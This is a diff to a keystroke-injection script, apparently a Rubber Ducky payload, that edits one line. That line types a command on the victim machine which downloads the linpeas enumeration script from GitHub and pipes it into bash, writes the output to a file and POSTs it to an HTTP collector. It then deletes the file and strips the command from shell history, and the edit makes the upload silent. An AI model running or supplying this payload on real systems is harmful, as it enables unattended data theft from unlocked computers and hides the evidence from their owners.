@@ -18,7 +18,7 @@ STRING set +o history
 DELAY 300
 ENTER
 REM launch recon and exfil then cover your tracks
-STRING nohup curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh | bash >treasure.txt && curl -d @treasure.txt -X POST http://localhost:3000/data && rm treasure.txt && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history &
+STRING nohup curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh | bash >treasure.txt && curl -d @treasure.txt -X POST http://localhost:3000/data >/dev/null && rm treasure.txt && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history &
 DELAY 500
 ENTER
 DELAY 300
